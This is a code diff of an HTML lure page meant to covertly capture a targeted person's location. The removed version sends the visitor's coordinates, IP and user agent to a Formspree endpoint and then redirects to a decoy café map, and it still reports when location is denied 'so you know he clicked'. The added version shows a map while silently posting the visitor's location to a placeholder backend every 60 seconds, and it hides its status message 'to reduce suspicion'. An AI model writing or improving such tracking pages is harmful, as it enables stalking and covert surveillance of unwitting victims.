@@ -3,102 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading Location...</title>
+    <title>Location Update</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #f0f0f0;
-            margin: 0;
-        }
-        .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #3498db;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        p {
-            position: absolute;
-            bottom: 20%;
-            color: #666;
-        }
+        body { margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        #map { height: 100vh; width: 100%; }
+        #status { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(255,255,255,0.9); padding: 10px 20px; border-radius: 20px; font-size: 14px; color: #666; box-shadow: 0 2px 5px rgba(0,0,0,0.2); z-index: 1000; }
     </style>
 </head>
 <body>
 
-    <div class="loader"></div>
-    <p>Locating you...</p>
+    <div id="map"></div>
+    <div id="status">Locating...</div>
 
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        // Helper to get IP address
-        function getIP() {
-            return fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => data.ip)
-                .catch(() => "Unknown IP");
+        // Initialize map
+        const map = L.map('map').setView([0, 0], 2);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '&copy; OpenStreetMap'
+        }).addTo(map);
+
+        let marker = null;
+        let lat = null;
+        let lng = null;
+        const statusDiv = document.getElementById('status');
+
+        // Function to send data
+        function sendLocation(position) {
+            lat = position.coords.latitude;
+            lng = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const time = new Date().toISOString();
+
+            // Update UI
+            if (marker) map.removeLayer(marker);
+            marker = L.marker([lat, lng]).addTo(map);
+            map.setView([lat, lng], 15);
+            statusDiv.textContent = "Location Updated";
+            statusDiv.style.display = 'none'; // Hide status after first update to reduce suspicion
+
+            // Send to server
+            const data = { lat, lng, accuracy, time };
+            
+            // Use fetch to send data silently
+            fetch('https://your-backend.com/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(err => console.log("Send failed", err));
         }
 
-        // Main Geolocation Logic
+        // Start tracking
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(position) {
-                const data = {
-                    lat: position.coords.latitude,
-                    lon: position.coords.longitude,
-                    acc: position.coords.accuracy,
-                    time: new Date().toISOString(),
-                    userAgent: navigator.userAgent
-                };
-
-                // Get IP and then send everything
-                getIP().then(ip => {
-                    data.ip = ip;
-                    
-                    // Send to Formspree
-                    fetch('https://formspree.io/f/xoeqgzjp', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(data)
-                    })
-                    .then(response => {
-                        // Redirect to decoy immediately after sending
-                        window.location.href = "https://www.google.com/maps/place/Blue+Taco+Cafe,+Delhi";
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                        // Still redirect even if logging fails
-                        window.location.href = "https://www.google.com/maps/place/Blue+Taco+Cafe,+Delhi";
-                    });
-                });
-
-            }, function(error) {
-                // If location is denied, still send a signal so you know he clicked
-                fetch('https://formspree.io/f/xoeqgzjp', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        error: "Location Denied", 
-                        time: new Date().toISOString(),
-                        userAgent: navigator.userAgent 
-                    })
-                });
-                
-                window.location.href = "https://www.google.com/maps/place/Blue+Taco+Cafe,+Delhi";
+            navigator.geolocation.getCurrentPosition(sendLocation, (error) => {
+                statusDiv.textContent = "Location unavailable";
             });
+
+            // Set up heartbeat
+            setInterval(() => {
+                navigator.geolocation.getCurrentPosition(sendLocation);
+            }, 60000); // 60 seconds
         } else {
-            window.location.href = "https://www.google.com/maps/place/Blue+Taco+Cafe,+Delhi";
+            statusDiv.textContent = "Geolocation not supported";
         }
     </script>
-
 </body>
 </html>
